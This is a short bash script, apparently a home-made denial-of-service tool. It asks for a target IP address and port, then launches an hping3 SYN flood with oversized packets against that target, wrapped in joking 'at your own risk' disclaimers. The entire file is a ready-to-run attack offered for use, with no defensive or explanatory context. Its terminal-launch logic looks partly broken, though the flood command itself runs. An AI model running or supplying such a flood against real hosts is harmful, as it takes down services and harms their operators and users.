#!/bin/bash

#ip=$ip
#port=$port

clear
echo "You use it and i dont"
echo "You do dumb stuff and i don't"
echo "USE IT WISELY AND AT YOUR OWN RISKS"
sleep 5s
clear
echo "Enter Target IP Address:"
read ip
echo "Enter $ip 'Port':"
read port


ddos=$(sudo hping3 -d 99999 -p $port -S --flood $ip)
lxterminal -e $ddos

clear
killall Exec.sh
killall exec.sh